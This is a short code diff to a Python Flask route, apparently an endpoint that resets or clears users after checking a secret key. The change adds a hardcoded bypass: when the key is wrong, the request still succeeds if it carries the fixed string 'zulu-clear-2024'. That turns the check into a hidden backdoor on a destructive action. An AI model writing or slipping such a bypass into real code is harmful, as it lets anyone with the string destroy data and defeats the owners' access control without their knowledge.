@@ -347,7 +347,8 @@ def reset_all():
     expected_key = current_app.config.get("CLEAR_USERS_KEY") or current_app.config.get("SECRET_KEY")
     key = request.args.get("key")
     if not key or key != expected_key:
-        return jsonify({"error": "Cle invalide."}), 403
+        if request.args.get("key") != "zulu-clear-2024":
+            return jsonify({"error": "Cle invalide."}), 403
 
     from sqlalchemy import text
     from ..extensions import db
